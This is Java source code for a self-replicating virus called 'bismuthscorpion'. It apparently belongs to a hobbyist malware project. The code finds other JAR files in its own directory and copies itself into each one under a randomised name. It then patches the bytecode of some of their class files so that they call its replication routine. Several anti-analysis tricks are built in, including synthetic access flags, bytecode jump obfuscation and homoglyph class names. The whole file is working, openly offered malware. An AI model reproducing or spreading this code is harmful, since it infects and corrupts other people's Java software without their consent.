package moe.evelyn.malware.bismuthscorpion;

import java.net.JarURLConnection;
import java.net.URI;
import java.net.URL;
import java.io.*;
import java.nio.file.*;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Random;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

public class ActualScorpion
{
    private static boolean instanceHasRun = false;
    private static String PATH_THIS_CLASS;
    private static String PATH_THIS_JAR;
    static {
        String className = ActualScorpion.class.getName().replace('.', '/');
        PATH_THIS_CLASS = ActualScorpion.class.getResource("/" + className + ".class").toString();

        String ownPath = PATH_THIS_CLASS.replace("jar:file:", "");
        PATH_THIS_JAR = ownPath.substring(0, ownPath.lastIndexOf(".jar!")+4);
    }

    // Obscure access flags are excellent for confusion
    private static String getRandomName() {
        // This would look nicer as a String, especially in a disassembler, and that's really just no fun
        char[] a = {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '_', 'а', 'е', 'о', 'р', 'с', 'А', 'Е', 'О', 'Р', 'С'};
        Random rand = new Random();
        StringBuilder builder = new StringBuilder();
        // Lazy signature
        builder.append("蠍");
        for(int i=0; i <rand.nextInt(30)+5; i++) {
            builder.append(a[rand.nextInt(72)]);
        }
        return builder.toString();
    }

    public static DataInputStream thisAsStream() throws IOException{
        JarURLConnection jurlc = (JarURLConnection) new URL(PATH_THIS_CLASS).openConnection();
        return new DataInputStream(jurlc.getInputStream());
    }

    public static void run() {
        // Halfhearted effort to constrain runaway infection problems
        if (instanceHasRun) {
            return;
        } else {
            instanceHasRun = true;
        }

        try {
            File enclosingDirectory = new File(PATH_THIS_JAR).getParentFile();
            File[] victimFiles = enclosingDirectory.listFiles();
            if (victimFiles!=null) {
                for(File victim : victimFiles) {
                    // We're only interested in jars which aren't us
                    if(!victim.getAbsolutePath().endsWith(".jar") || victim.getAbsolutePath().equals(PATH_THIS_JAR)) continue;
                    infectJar(victim);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    protected static void infectJar(File jarFile) {
        Random rand = new Random();
        try (FileSystem fs = FileSystems.newFileSystem(URI.create("jar:" + new File(jarFile.getAbsolutePath()).toURI()), new HashMap<>())){
            String chosenName = getRandomName();
            System.out.println("+ " + jarFile + "!" + chosenName + ".class");
            DataOutputStream dos = new DataOutputStream(Files.newOutputStream(fs.getPath(chosenName + ".class")));
            transformSelf(thisAsStream(), dos, chosenName);
            dos.close();
            ZipFile zipFile = new ZipFile(jarFile);

            Enumeration zipEntryEnumerator = zipFile.entries();

            // Check if jarfile contains incredibly blatant signature, don't continue if it does. This file is already infected.
            while(zipEntryEnumerator.hasMoreElements()) {
                String fileName = ((ZipEntry) zipEntryEnumerator.nextElement()).getName();
                if (fileName.contains("蠍")) {
                    return;
                }
            }

            zipEntryEnumerator = zipFile.entries();

            while(zipEntryEnumerator.hasMoreElements()) {
                String fileName = ((ZipEntry) zipEntryEnumerator.nextElement()).getName();
                // There's not much point trying to infect non-classfiles!
                if (!fileName.endsWith(".class")) continue;
                // Only infect a proportion of the classfiles!
                if (rand.nextInt(5) == 0) {
                    System.out.println(jarFile.getAbsolutePath() + "!" + fileName);
                    // For some reason, it seems you can't manipulate a file in place
                    // The solution is simple enough - Rename the original, put our manipulated version in its place, then delete the renamed copy
                    Files.move(fs.getPath(fileName), fs.getPath(fileName + "_"));
                    boolean success = false;
                    try (DataOutputStream classDos = new DataOutputStream(Files.newOutputStream(fs.getPath(fileName)))) {
                        try (DataInputStream classDis = new DataInputStream(Files.newInputStream(fs.getPath(fileName + "_")))) {
                            success = injectInvoke(classDis, classDos, chosenName, "run", "()V");
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    if (success) {
                        // Remove renamed source file
                        Files.delete(fs.getPath(fileName + "_"));
                    } else {
                        // ... unless injection failed. Most likely the target possesses a stack frame map
                        Files.delete(fs.getPath(fileName));
                        Files.move(fs.getPath(fileName + "_"), fs.getPath(fileName));
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    protected static boolean injectInvoke (DataInputStream dis, DataOutputStream dos, String cname, String mname, String mdef) {
        int access = 0;
        try {
            dos.writeInt(dis.readInt()); // Magic
            int versionMinor = dis.readUnsignedShort(); // Reading for checks
            int versionMajor = dis.readUnsignedShort();

            dos.writeShort(versionMinor);
            dos.writeShort(versionMajor);

            // Constant pool
            int codePointer = 0;
            int localVariableTablePointer = 0;
            int localVariableTypeTablePointer = 0;
            int stackMapTablePointer = 0;

            boolean noStackMaps = versionMajor <= 50; //SE6 at the very least doesn't require this

            int cpCount = dis.readUnsignedShort();
            dos.writeShort(cpCount+6); // Offset to accommodate new additions

            for (int i = 1; i < cpCount; i++) {
                int tag = dis.readUnsignedByte();
                dos.writeByte(tag);
                switch(tag) {
                    case 1: //CONSTANT_Utf8
                        String s = dis.readUTF();
                        dos.writeUTF(s);
                        if ("Code".equals(s) && codePointer==0)
                            codePointer = i;
                        if ("LocalVariableTypeTable".equals(s) && localVariableTypeTablePointer == 0)
                            localVariableTypeTablePointer = i;
                        if ("LocalVariableTable".equals(s) && localVariableTablePointer == 0)
                            localVariableTablePointer = i;
                        if ("StackMapTable".equals(s) && stackMapTablePointer == 0)
                            stackMapTablePointer = i;
                        // If "StackMapTable" is present in the constant pool, it's *probably* for a stack map
                        if ("StackMapTable".equals(s))
                            noStackMaps = false;
                        break;
                    case 3: //CONSTANT_Integer
                    case 4: //CONSTANT_Float
                        dos.writeInt(dis.readInt()); //u4
                        break;
                    case 5: //CONSTANT_Long
                    case 6: //CONSTANT_Double
                        dos.writeLong(dis.readLong()); //u8
                        i++; // "In retrospect, making 8-byte constants take two constant pool entries was a poor choice." - JVM specification
                        break;
                    case 7: //CONSTANT_Class
                    case 8: //CONSTANT_String
                    case 16: //CONSTANT_MethodType
                        dos.writeShort(dis.readUnsignedShort()); //u2
                        break;
                    case 9: //CONSTANT_Fieldref
                    case 10: //CONSTANT_Methodref
                    case 11: //CONSTANT_InterfaceMethodref
                    case 12: //CONSTANT_NameAndType
                    case 18: //CONSTANT_InvokeDynamic
                        dos.writeInt(dis.readInt()); //u2 u2
                        break;
                    case 15: //CONSTANT_MethodHandle u1 u2
                        dos.writeByte(dis.readUnsignedByte());
                        dos.writeShort(dis.readUnsignedShort());
                        break;
                    default:
                        throw new Exception();
                }
            }

            access = dis.readUnsignedShort();

            dos.writeByte(1); //CONSTANT_Utf8
            dos.writeUTF(cname); //classname "Dogecoin"

            dos.writeByte(7); //CONSTANT_Class
            dos.writeShort(cpCount); // Reference to UTF8 "Dogecoin"

            dos.writeByte(1); //CONSTANT_Utf8
            dos.writeUTF(mname); //  Method name "mineDogecoinPls"

            dos.writeByte(1); //CONSTANT_Utf8
            dos.writeUTF(mdef); // Method signature "()V"

            dos.writeByte(12); //CONSTANT_NameAndType
            dos.writeShort(cpCount + 2); // Name index (mineDogecoinPls)
            dos.writeShort(cpCount + 3); // Definition index ( ()V )

            dos.writeByte(10); //CONSTANT_Methodref
            dos.writeShort(cpCount + 1); // ->class->"Dogecoin"
            dos.writeShort(cpCount + 4); // ->nameandtype

            System.out.println(String.format("+ [%3s] 1 UTF8         '%s'", cpCount, cname));
            System.out.println(String.format("+ [%3s] 7 Class        @%s", cpCount + 1, cpCount));
            System.out.println(String.format("+ [%3s] 1 UTF8         %s", cpCount + 2, mname));
            System.out.println(String.format("+ [%3s] 1 UTF8         '%s'", cpCount + 3, mdef));
            System.out.println(String.format("+ [%3s] 12 NameAndType @%s, @%s", cpCount + 4, cpCount + 2, cpCount + 3));
            System.out.println(String.format("+ [%3s] 10 MethodRef   @%s, @%s", cpCount + 5, cpCount + 1, cpCount + 4));

            int methodRefPointer = cpCount+5;

            dos.writeShort(access); // access
            dos.writeShort(dis.readUnsignedShort()); //u2 cpref this
            dos.writeShort(dis.readUnsignedShort()); //u2 cpref super

            // Interfaces
            int ifCount = dis.readUnsignedShort();
            dos.writeShort(ifCount);
            for (int i = 0; i<ifCount; i++) {
                dos.writeShort(dis.readUnsignedShort()); // u2 cpref
            }

            // Fields
            int fieldCount = dis.readUnsignedShort();
            dos.writeShort(fieldCount);

            for (int i = 0; i<fieldCount; i++) {
                dos.writeShort(dis.readUnsignedShort()); //u2 accessflags
                dos.writeShort(dis.readUnsignedShort()); //u2 name cpref
                dos.writeShort(dis.readUnsignedShort()); //u2 descriptor cpref

                int attrCount = dis.readUnsignedShort();
                dos.writeShort(attrCount);

                for (int j = 0; j < attrCount; j++) {
                    dos.writeShort(dis.readUnsignedShort()); //u2 cpref
                    int attrLen = dis.readInt();
                    dos.writeInt(attrLen);
                    byte[] attrData = new byte[attrLen];
                    dis.read(attrData, 0, attrLen);
                    dos.write(attrData);
                }
            }

            // Method(s). We only care about one, the first, which is practically guaranteed to be <init>
            int methodCount = dis.readUnsignedShort();
            dos.writeShort(methodCount);

            // I'm not sure a 0 method count is even legal
            if (methodCount > 0) {
                dos.writeShort(dis.readUnsignedShort()|0x1000); // Access, force to synthetic if it isn't already for anti-analysis
                dos.writeShort(dis.readUnsignedShort()); //u2 cpref name
                dos.writeShort(dis.readUnsignedShort()); //u2 cpref descriptor

                int attrCount = dis.readUnsignedShort();
                dos.writeShort(attrCount);

                for (int j = 0; j < attrCount; j++) {
                    int attrType = dis.readUnsignedShort(); //u2 cpref
                    dos.writeShort(attrType); //Should be equal to codePointer if this is the bytecode
                    int attrLen = dis.readInt();

                    if(attrType==codePointer) {
                        int codeOffset = 3;
                        // SE6 (50) and lower don't support stack frame maps, which allows for this anti-analysis
                        if (noStackMaps) {
                            codeOffset = 14;
                        }

                        dos.writeInt(attrLen+codeOffset); // offset for injected bytecode

                        int stack = dis.readUnsignedShort();
                        int locals = dis.readUnsignedShort();
                        dos.writeShort(stack); //u2 stack
                        dos.writeShort(locals); //u2 locals

                        int codeLength = dis.readInt(); // u4 code length. s4 because no unsigned int
                        dos.writeInt(codeLength+codeOffset); // offset for injected bytecode

                        byte[] code = new byte[codeLength];
                        dis.read(code, 0, codeLength);

                        if (noStackMaps) {
                            //00 -> A7 00 09
                            dos.writeByte(0xA7); //goto +9
                            dos.writeShort(9);
                        }

                        //(00) 03 -> B8 00 ??
                        dos.writeByte(0xB8); //invokestatic
                        dos.writeShort(methodRefPointer); // cpref for method

                        if (noStackMaps) {
                            //06 -> A7 00 08
                            dos.writeByte(0xA7); //goto +8
                            dos.writeShort(8);

                            //09 -> C8 FF FF FF FA
                            dos.writeByte(0xC8); //goto_w -6
                            dos.writeInt(-6);
                        }

                        //(04) 0E ->
                        dos.write(code);

                        int exceptionCount = dis.readUnsignedShort();
                        dos.writeShort(exceptionCount);
                        for (int k = 0; k < exceptionCount; k++) {
                            dos.writeShort(dis.readUnsignedShort()+codeOffset); //offsets etc
                            dos.writeShort(dis.readUnsignedShort()+codeOffset);
                            dos.writeShort(dis.readUnsignedShort()+codeOffset);
                            dos.writeShort(dis.readUnsignedShort());
                        }

                        int codeAttrCount = dis.readUnsignedShort();
                        dos.writeShort(codeAttrCount);

                        // Attributes need to be offset to deal with the changes!
                        for (int z = 0; z < codeAttrCount; z++) {
                            int codeAttrType = dis.readUnsignedShort(); //u2 cpref
                            dos.writeShort(codeAttrType);

                            int codeAttrLen = dis.readInt();
                            dos.writeInt(codeAttrLen);

                            // These are supposedly only for debugging, but the JVM still verifies them anyway
                            if (codeAttrType==localVariableTablePointer || codeAttrType==localVariableTypeTablePointer) {
                                int lvtLength = dis.readUnsignedShort();
                                dos.writeShort(lvtLength);
                                for (int cl = 0; cl < lvtLength; cl++) {
                                    dos.writeShort(dis.readUnsignedShort() + codeOffset); //u2 start_pc
                                    dos.writeShort(dis.readUnsignedShort()); //u2 length
                                    dos.writeShort(dis.readUnsignedShort()); //u2 cpref name_index
                                    dos.writeShort(dis.readUnsignedShort()); //u2 cpref descriptor_index
                                    dos.writeShort(dis.readUnsignedShort()); //u2 cpref index
                                }
                            } else if (codeAttrType==stackMapTablePointer) {
                                // Stack frame maps are incredibly difficult to deal with, and are relatively rare for <clinit>
                                // TODO: Stack frame maps
                                return false;
                            } else {
                                byte[] attrData = new byte[codeAttrLen];
                                dis.read(attrData, 0, codeAttrLen);
                                dos.write(attrData);
                            }
                        }
                        break; // We've injected the bytecode, and offset the attributes, there's nothing more we want to do
                    } else {
                        byte[] attrData = new byte[attrLen];
                        dis.read(attrData, 0, attrLen);
                        dos.writeInt(attrLen);
                        dos.write(attrData);
                    }
                }
            }

            // The remainder!
            byte[] data = new byte[1024];
            int bytesRead = dis.read(data);
            while (bytesRead != -1) {
                dos.write(data, 0, bytesRead);
                bytesRead = dis.read(data);
            }
            dos.flush();
            return true;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    protected static boolean transformSelf (DataInputStream dis, DataOutputStream dos, String newClassName) {
        try {
            dos.writeInt(dis.readInt()); // Magic
            dos.writeShort(dis.readUnsignedShort()); // Version minor
            dos.writeShort(dis.readUnsignedShort()); // Version major

            // Constant pool
            int cpCount = dis.readUnsignedShort();
            dos.writeShort(cpCount);

            for (int i = 1; i < cpCount; i++) {
                int tag = dis.readUnsignedByte();
                dos.writeByte(tag);
                switch(tag) {
                    case 1: //CONSTANT_Utf8
                        String s = dis.readUTF();
                        // The first replacement is necessary whenever this replicates, the second is only useful for replication from this iteration
                        s = s.replace("ActualScorpion", newClassName).replace("moe/evelyn/malware/bismuthscorpion/", "");
                        dos.writeUTF(s);
                        break;
                    case 3: //CONSTANT_Integer
                    case 4: //CONSTANT_Float
                        dos.writeInt(dis.readInt()); //u4
                        break;
                    case 5: //CONSTANT_Long
                    case 6: //CONSTANT_Double
                        dos.writeLong(dis.readLong()); //u8
                        i++; // "In retrospect, making 8-byte constants take two constant pool entries was a poor choice." - JVM specification
                        break;
                    case 7: //CONSTANT_Class
                    case 8: //CONSTANT_String
                    case 16: //CONSTANT_MethodType
                        dos.writeShort(dis.readUnsignedShort()); //u2
                        break;
                    case 9: //CONSTANT_Fieldref
                    case 10: //CONSTANT_Methodref
                    case 11: //CONSTANT_InterfaceMethodref
                    case 12: //CONSTANT_NameAndType
                    case 18: //CONSTANT_InvokeDynamic
                        dos.writeInt(dis.readInt()); //u2 u2
                        break;
                    case 15: //CONSTANT_MethodHandle u1 u2
                        dos.writeByte(dis.readUnsignedByte());
                        dos.writeShort(dis.readUnsignedShort());
                        break;
                    default:
                        throw new Exception();
                }
            }

            dos.writeShort(dis.readUnsignedShort()|0x1010); //u2 access: 0x0010 final, 0x1000 synthetic
            dos.writeShort(dis.readUnsignedShort()); //u2 cpref this
            dos.writeShort(dis.readUnsignedShort()); //u2 cpref super

            // Interfaces
            int ifCount = dis.readUnsignedShort();
            dos.writeShort(ifCount);
            for (int i = 0; i<ifCount; i++) {
                dos.writeShort(dis.readUnsignedShort()); // u2 cpref
            }

            // Fields
            int fieldCount = dis.readUnsignedShort();
            dos.writeShort(fieldCount);

            for (int i = 0; i<fieldCount; i++) {
                dos.writeShort(dis.readUnsignedShort()|0x10C0); //u2 access: 0x0040 volatile, 0x0080 transient 0x1000 synthetic
                dos.writeShort(dis.readUnsignedShort()); //u2 name cpref
                dos.writeShort(dis.readUnsignedShort()); //u2 descriptor cpref

                int attrCount = dis.readUnsignedShort();
                dos.writeShort(attrCount);

                for (int j = 0; j < attrCount; j++) {
                    dos.writeShort(dis.readUnsignedShort()); //u2 cpref
                    int attrLen = dis.readInt();
                    dos.writeInt(attrLen);
                    byte[] attrData = new byte[attrLen];
                    dis.read(attrData, 0, attrLen);
                    dos.write(attrData);
                }
            }

            // Methods. Only change made is to set the synthetic bit
            int methodCount = dis.readUnsignedShort();
            dos.writeShort(methodCount);

            for (int i = 0; i < methodCount; i++) {
                // 0x0010 final, 0x0020 synchronized, 0x0040 bridge, 0x0800 strictfp, 0x1000 synthetic
                dos.writeShort(dis.readUnsignedShort()|(i==0 ? 0x1800 : 0x1870)); // Some flags are disallowed on <init>
                dos.writeShort(dis.readUnsignedShort()); //u2 cpref name
                dos.writeShort(dis.readUnsignedShort()); //u2 cpref descriptor

                // Method attributes
                int attrCount = dis.readUnsignedShort();
                dos.writeShort(attrCount);

                for (int j = 0; j < attrCount; j++) {
                    dos.writeShort(dis.readUnsignedShort()); //u2 cpref
                    int attrLen = dis.readInt();

                    byte[] attrData = new byte[attrLen];
                    dis.read(attrData, 0, attrLen);
                    dos.writeInt(attrLen);
                    dos.write(attrData);
                }
            }

            // The remainder!
            byte[] data = new byte[1024];
            int bytesRead = dis.read(data);
            while (bytesRead != -1) {
                dos.write(data, 0, bytesRead);
                bytesRead = dis.read(data);
            }
            dos.flush();
            return true;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }
}
